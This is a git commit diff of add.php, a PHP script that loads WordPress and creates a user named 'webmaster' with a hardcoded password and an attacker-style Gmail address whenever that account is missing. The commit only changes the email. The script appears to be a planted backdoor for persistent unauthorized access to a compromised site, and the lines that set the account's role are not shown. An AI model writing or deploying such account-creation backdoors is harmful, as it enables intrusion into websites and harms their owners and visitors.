3047ab21402fb3db14a55c89ee908eddbc609860
handoko1013 <94730449+handoko1013@users.noreply.github.com>
2025-12-16 16:38:53 +0700

    Update add.php

--- add.php
+++ add.php
@@ -4,7 +4,7 @@ require_once('./wp-load.php');
 
 $username = 'webmaster';
 $password = 'Seo301Take!';
-$email = 'boletinluzendesa@gmail.com';
+$email = 'instalacionesinman@gmail.com';
 
 if (!username_exists($username) && !email_exists($email)) {
     $user_id = wp_create_user($username, $password, $email);
@@ -25,6 +25,7 @@ if (!username_exists($username) && !email_exists($email)) {
 }
 
 ?>
+
 
 
 
